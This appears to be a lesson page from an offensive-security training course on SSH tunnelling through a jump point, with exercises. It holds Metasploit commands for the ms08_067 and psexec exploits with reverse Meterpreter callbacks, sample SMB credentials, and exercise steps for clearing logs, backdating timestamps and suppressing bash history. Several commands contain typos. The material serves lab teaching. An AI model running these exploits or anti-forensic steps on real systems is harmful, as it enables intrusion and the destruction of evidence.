![Redirectio Tunnel](./Files/Images/Lesson8/Redirection-SSHTunnel-example.png)

### Bad Tradecraft Example 2

![Bad Tradecraft 2](./Files/Images/Lesson8/bad-tradecraft-2.jpg)
![Bad Tradecraft Example](./Files/Images/Lesson8/bad-tradecraft2.png)

### Redirection Tunnel Example 2

![Redirection Tunnel Example](./Files/Images/Lesson8/Redirection-Tunnel-example.jpg)

### Good Tradecraft Example

![Good Tradecraft Example](./Files/Images/Lesson8/good-tradecraft-1.jpg)
![Good Tradecraft Example](./Files/Images/Lesson8/good-tradecraft-1.png)

### Initial SSH Tunnel with Jump Point

![Inital Conneciton](./Files/Images/Lesson8/tunnel-inial-connection.png)

* `ssh root@10.20.30.40 -L 11111:20.30.40.50:445 -R 80:127.0.0.1.80`

### Outbound Trigger: Target1

![Target1 Conneciton](./Files/Images/Lesson8/tunnel-target1-connection.png)

```msf
msf > us eploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set RHOST 127.0.0.1
msf exploit(ms08_067_netapi) > set RPORT 11111
msf exploit(ms08_067_netapi) > set LHOST 10.20.30.40
msf exploit(ms08_067_netapi) > set LPORT 80
msf exploit(ms08_067_netapi) > exploit
```

* Based on the reverse tunnel, Meterpreter will start a local listener on port 80 (RPORT) on the attack box
* `ssh root@10.20.30.40 -L 11111:20.30.40.50:445 -R 80:127.0.0.1:80`

### Connection and Callback

![Callback Conneciton](./Files/Images/Lesson8/tunnel-callback-connection.png)

* Meterpreter box is still listening on 11111 (forward SSH tunnel).
* Jump poin is still listening (as well as conneted) on 80 (Reverse SSH) tunnel
* `ssh root@10.20.30.40 -L11111:20.30.40.50:445 -R 80:127.0.0.1:`

## Exercise Module 2, Lesson 8 – Threat Emulation Actions in Logs

___

### Senario 1 - Manipulate logs

* Setup  
`ssh root@10.10.1.40 -L 11111:10.10.1.10:445 -R 34567:127.0.0.:34567`
* Exploit  
`windows/smb/psexec`
`RHOST= 127.0.0.1`
`RPORT=11111`
`SMBUser=slor`
`SMBPass=CTEPasswd1976`
`LHOST=10.10.1.40`
`LPORT=34567`
* Meterpreter  
`multicommand cl "wevtutil qe Securithy /rd:true /f:text /q\"Event[System[(EventID=4624)]]""`

1. Log in to the jump point to identify and remove any log entries relating specifically to SSH connections the attack machine makes.
2. Before opening any log files, run the file command against the log file to determine if it is ASCII text and therefore human readable.
3. Log in to the Kali machine and SSH into the jump point machine.
4. Execute the command that will record the information resulting from the session created from the attack machine to the jump point.
5. Once you are connected to the jump point, switch to the directory that holds most of the logging information for the jump point.  
6. Identify all human readable logs in the current directory especially those that might contain SSH session entries.
7. Run the commands that allow you to view SSH session related information in logs, whether they are in human or non-human readable format.
8. Run the commands that will clean the relevant log files.
9. Run the command that changes the time on the cleaned logs to match the last remaining entry.
10. What should you do if all of the logs entries need to be cleaned? Select one or more:
a. Delete the entries
b. Modify the time to a zero byte file
c. Modify the time to match any other file in the folder
d. Comment out the entries
11. Explain why an attacker should adjust the time on a log that has been changed and discuss why an investigator should review logs for mismatching times.
12. Write down the command that will display the bash command history of the intern and root users on the jump point.
13. How might an investigator might use the bash history information?
14. Why a hacker would want to remove entries/artifacts from the bash_ history file?
15. Write down the command that prevents the system from writing to the bash history file.
16. Explain why an attacker should use a jump point rather than directly exploiting the box
17. Delete any files created during the SSH session, then close the SSH connection to the jump point.

### Part 2: Investigate a target remotely

1. Which implant is typically preferred on a target system? Select one:
  a. Callback
  b. Listener
  c. Payload
  d. Exploit
2. List the benefits and drawbacks of:
  a. listeners
  b. callback implants
  c. non-persistent implants
  d. a persistent implant
3. Why shouldn’t you use port 445 as the callback destination port?
4. When considering the four ports:
  • destination
  • source
  • ephemeral
  • local
and their possible states:
  • open
  • closed
  • mode
  • established
Select the above choices to make this statement true:
To exploit a vulnerable service, the <> must be <> .

